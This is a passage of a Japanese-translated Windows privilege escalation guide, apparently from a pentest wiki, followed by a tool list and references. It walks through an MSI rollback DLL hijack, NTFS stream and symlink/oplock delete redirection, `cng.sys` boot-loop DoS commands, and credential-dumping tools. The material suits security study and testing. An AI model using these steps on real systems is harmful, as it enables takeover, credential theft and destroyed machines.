この削除 primitive は、以下の rollback chain に適用できます。別個の `Installer\Folders` レコードを保持し、保護された `C:\Config.Msi` を削除して、NULL DACL で再作成し、installer が DACL を強化する前に `WRITE_DAC` が許可された handle を保持します。事前に開いた handle で `NtSetSecurityObject` を使って permissive な DACL を復元でき、その後 rollback が再開する前に生成された `.rbs` を置き換えられます。<sup>[[41]](#references)</sup>

Microsoft は、新しい feature gate が有効な場合に `CMsiTransaction::SetEEUIDirectoryAndFilter` が `ScheduleFileOrFolderDelete` を呼び出さないようにして、この問題を修正しました。COM call は引き続き success を返す場合がありますが、攻撃者が制御するパスは `TempPackages` に登録されなくなります。method の return が success かどうかで patch を確認するのではなく、2025 年 4 月の Windows security update を適用してください。<sup>[[41]](#references)[[42]](#references)</sup>

この手法をまとめると、次のとおりです。

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空にしておく）**

- Step 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - **non-admin user** が実行できるよう、installer を **"UAC Compliant"** に設定します。
    - インストール後もファイルの **handle** を開いたままにします。

- Step 2: Uninstall を開始する
    - 同じ `.msi` を uninstall します。
    - Uninstall process がファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback backup）に名前を変更し始めます。
    - 開いている file handle を `GetFinalPathNameByHandle` で **poll** し、ファイルが `C:\Config.Msi\<random>.rbf` になるタイミングを検出します。

- Step 3: 独自の同期処理
    - `.msi` には、以下を行う **custom uninstall action (`SyncOnRbfWritten`)** が含まれています。
        - `.rbf` の書き込み完了を通知する。
        - その後、uninstall を続行する前に別の event を **待機** する。

- Step 4: `.rbf` の削除を阻止する
    - 通知を受けたら、`FILE_SHARE_DELETE` を指定せずに **`.rbf` ファイルを開きます**。これにより **削除を阻止できます**。
    - その後、uninstall を完了できるよう、応答の event を通知します。
    - Windows Installer は `.rbf` の削除に失敗し、すべての内容を削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を手動で削除する
    - 攻撃者が `.rbf` ファイルを手動で削除します。
    - これで **`C:\Config.Msi` は空になり、Hijack できる状態**になります。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability を発動させて** `C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback script を悪意のあるものに置き換える**

- Step 6: 弱い ACL で `C:\Config.Msi` を再作成する
    - `C:\Config.Msi` フォルダーを自分で再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` が許可された **handle を開いたままにします**。

- Step 7: 別の Install を実行する
    - 次の設定で `.msi` を再度インストールします。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的な failure を発生させる variable。
    - この install は、`.rbs` と `.rbf` を読み込む **rollback** を再び発生させるために使います。

- Step 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ちます。
    - その filename を取得します。

- Step 9: Rollback の前に同期する
    - `.msi` には、以下を行う **custom install action (`SyncBeforeRollback`)** が含まれています。
        - `.rbs` が作成されたときに event を通知する。
        - その後、続行する前に **待機** する。

- Step 10: 弱い ACL を再適用する
    - `.rbs created` event を受信した後:
        - Windows Installer は `C:\Config.Msi` に **強い ACL を再適用**します。
        - しかし、`WRITE_DAC` が許可された handle をまだ保持しているため、**弱い ACL を再適用**できます。

> ACL は **handle を開くときにのみ適用される**ため、引き続きフォルダーに書き込めます。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
    - `.rbs` ファイルを、Windows に次の操作を指示する **偽の rollback script** で上書きします。
        - `.rbf` ファイル（悪意のある DLL）を、**privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。
    - **悪意のある SYSTEM-level payload DLL** を含む偽の `.rbf` を配置します。

- Step 12: Rollback を発動する
    - sync event を通知し、installer を再開させます。
    - **type 19 custom action (`ErrorOut`)** は、既知の時点で install を **意図的に失敗**させるよう設定されています。
    - これにより **rollback が始まります**。

- Step 13: SYSTEM が DLL をインストールする
    - Windows Installer は次の操作を行います。
        - 悪意のある `.rbs` を読み込む。
        - `.rbf` DLL を target location にコピーする。
    - これで **SYSTEM が読み込む path に、悪意のある DLL が配置されます**。

- Final Step: SYSTEM code を実行する
    - Hijack した DLL を読み込む、信頼された **auto-elevated binary**（例: `osk.exe`）を実行します。
    - **これで**、コードが **SYSTEM として実行されます**。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

主な MSI rollback 手法（前述）は、**フォルダー全体**（例: `C:\Config.Msi`）を削除できることを前提としています。しかし、脆弱性で可能なのが **任意のファイル削除**だけの場合はどうでしょうか？

**NTFS internals** を悪用できます。すべてのフォルダーには、次の名前の隠し alternate data stream があります。

```
C:\SomeFolder::$INDEX_ALLOCATION
```

このストリームには、フォルダーの**インデックスメタデータ**が保存されています。

そのため、フォルダーの `::$INDEX_ALLOCATION` ストリームを**削除すると**、NTFS はファイルシステムから**フォルダー全体を削除します**。

これは、次のような標準的なファイル削除 API を使って実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> file delete API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダー内の内容の削除から SYSTEM EoP へ
任意のファイルやフォルダーを削除できる primitive ではなく、**攻撃者が制御するフォルダーの *内容* を削除できる** primitive しか使えない場合はどうでしょうか？

1. Step 1: おとりフォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock によって **実行が一時停止します**。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM processをトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt`に到達すると、**oplockがトリガーされ**、制御がコールバックに渡されます。

4. Step 4: oplockコールバック内 — 削除先をリダイレクトする

- Option A: `file1.txt`を別の場所に移動する
    - oplockを破損させずに`folder1`を空にします。
    - `file1.txt`を直接削除しないでください。そうするとoplockが早期に解放されます。

- Option B: `folder1`を**junction**に変換する:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- オプション C: `\RPC Control` に **symlink** を作成:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> これはフォルダーのメタデータを格納するNTFS内部ストリームを対象としており、これを削除するとフォルダーが削除されます。

5. Step 5: oplockを解放する
- SYSTEMプロセスは処理を続け、`file1.txt`を削除しようとします。
- しかし、junctionとsymlinkにより、実際に削除されるのは次のものです。
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: `C:\Config.Msi` が SYSTEM によって削除されます。

### 任意フォルダーの作成から永続的な DoS へ

**任意のフォルダーを SYSTEM/admin として作成できる** primitive を悪用します。**ファイルを書き込めない**場合や、**弱い権限を設定できない**場合でも可能です。

**重要な Windows driver** の名前を付けた**フォルダー**（ファイルではありません）を作成します。例:
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` カーネルモードドライバーに対応します。
- **事前にフォルダーとして作成しておくと**、Windows は起動時に実際のドライバーを読み込めなくなります。
- その後、Windows は起動中に `cng.sys` を読み込もうとします。
- フォルダーを検出すると、**実際のドライバーを解決できず**、**クラッシュするか、起動が停止します**。
- **フォールバックはなく**、外部からの介入（起動修復やディスクへのアクセスなど）がなければ、**復旧できません**。

### 特権ログ／バックアップパスと OM symlink による任意ファイルの上書き／起動 DoS

**特権サービス**が**書き込み可能な設定ファイル**から読み取ったパスにログ／エクスポートを書き込む場合、**Object Manager symlink + NTFS mount point** でそのパスをリダイレクトすると、特権による書き込みを任意ファイルの上書きに利用できます（SeCreateSymbolicLinkPrivilege がなくても可能です）。<sup>[[15]](#references)</sup>

**要件**
- 書き込み先パスを保存する設定ファイルを攻撃者が書き換えられる（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できる（James Forshaw の [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作（ログ、エクスポート、レポート）。

**実行例**
1. 設定ファイルを読み取り、特権ログの保存先を特定します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 管理者権限なしでパスをリダイレクトします。
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むまで待ちます（例: 管理者が「テスト SMS を送信」を実行する）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされたターゲットを（hex/PE parserで）調べ、破損を確認します。再起動すると、Windows が改ざんされたドライバーのパスから読み込むため、**boot loop DoS** が発生します。この手法は、特権サービスが書き込み用に開く保護対象ファイル全般に応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在する場合、そちらが先に試される可能性があり、破損データを使った信頼性の高い DoS sink になります。



## **High Integrity から System へ**

### **新しい service**

すでに High Integrity プロセスで実行している場合、**SYSTEM への昇格**は、新しい service を**作成して実行するだけ**で簡単に行えることがあります:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binaryを作成する場合は、有効なserviceであること、または必要な処理をすばやく実行することを確認してください。有効なserviceでない場合、20秒で強制終了されます。

### AlwaysInstallElevated

High Integrity processから、**AlwaysInstallElevatedレジストリエントリを有効化**し、_**.msi**_ wrapperを使ってreverse shellを**インストール**できます。\
関連するレジストリキーと_.msi_パッケージのインストール方法については、[こちらを参照してください。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

[**コードはこちらにあります**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらのtoken privilegeがあれば（おそらく、すでにHigh Integrityのprocess内で見つかります）、SeDebug privilegeを使って（保護されたprocessを除く）**ほぼすべてのprocessを開き**、そのprocessの**tokenをコピー**して、そのtokenを使った**任意のprocessを作成**できます。\
この手法では通常、**すべてのtoken privilegeを持つSYSTEM実行中のprocessを選択します**（_すべてのtoken privilegeを持たないSYSTEM processも存在します_）。\
**提案した手法を実行するコード例は**[**こちらにあります**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この手法は、meterpreterが`getsystem`で権限昇格するときに使われます。**pipeを作成し、そのpipeに書き込むserviceを作成または悪用する**手法です。続いて、**`SeImpersonate`** privilegeを使ってpipeを作成した**server**が、pipe client（service）のtokenを**偽装**し、SYSTEM privilegeを取得できます。\
[**named pipeについて詳しく知りたい場合は、こちらをお読みください**](#named-pipe-client-impersonation)。\
[named pipeを使ってHigh IntegrityからSystemに移行する方法の例は、こちらをお読みください](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEMとして実行されているprocessによってロードされるdllを乗っ取る**ことができれば、その権限で任意のコードを実行できます。そのため、Dll Hijackingもこの種の権限昇格に有効です。さらに、High Integrity processからは、dllのロードに使われるフォルダーへの**書き込み権限**があるため、**はるかに簡単に実行できます**。\
[**Dll hijackingについて詳しくはこちらをご覧ください**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**こちらをお読みください:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windowsのローカル権限昇格ベクトルを探す最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルをチェックします（**[**こちらを参照**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 設定ミスの可能性をチェックし、情報を収集します（**[**こちらを参照**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPの保存済みsession情報を抽出します。ローカルで実行する場合は-Thoroughを使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerから認証情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したpasswordをdomain全体に対してsprayします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell製のADIDNS/LLMNR/mDNS spoofingおよびman-in-the-middleツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的なWindows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知のprivesc脆弱性を検索します（Watsonにより非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **（Admin権限が必要）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知のprivesc脆弱性を検索します（VisualStudioでコンパイルする必要があります）（[**コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 設定ミスを探してhostをenumerateします（privescツールというより、情報収集ツールです）（コンパイルが必要です）**（**[**コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**）**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから認証情報を抽出します（githubにコンパイル済みexeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#移植版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 設定ミスをチェックします（githubにコンパイル済み実行ファイルがあります）。推奨しません。Win10では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 設定ミスの可能性をチェックします（python製exe）。推奨しません。Win10では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿をもとに作成されたツールです（正常に動作するためにaccesschkは不要ですが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルで動作するpython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルで動作するPython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

.NETの正しいバージョンを使ってプロジェクトをコンパイルする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者hostにインストールされている.NETのバージョンを確認するには、次のようにします:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Privilege Escalationの基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [弱いフォルダー権限を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalationワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: ATが新たな定番 (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - OSCP総合ガイド](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalationガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalationチェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentesters向けWindows Privilege Escalation手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBA macro phishing → hMailServerのcredential復号 → Veeam CVE-2023-27532によるSYSTEM権限の取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)とkernel token窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Foxを追う: Kernelの影における追跡と逃走](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADAシステムに存在する特権ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Linkテストツール – CreateSymlinkの使用方法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: WindowsでのSymbolic Linkの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF移植版)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windowsにおける危険なモジュール解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules`フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++チェックリストの課題と解答](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - サービスバイナリの乗っ取り](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [MicroslopでのPwn2Own: CLDFLTとDirectX Kernelの競合状態を連鎖させたWindows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配する1つのI/O Ring: Windows 11における完全な読み書きExploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意ファイル削除を悪用した権限昇格とその他の優れたテクニック](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPsのExploitコード](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS攻撃 Part 2: CVE-2020-1013、Windows 10のLocal Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential ManagerとWindows Vaultを調べる](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: イメージの変更が権限昇格につながる場合](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 SSH AgentからのSSH秘密鍵の抽出](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – 企業の更新サーバーをバックドア工場に変える (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – 企業の更新サーバーをバックドア工場に変える (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installerフォルダー削除による権限昇格](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: 足跡をたどり、NT AUTHORITY\SYSTEMに戻る](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
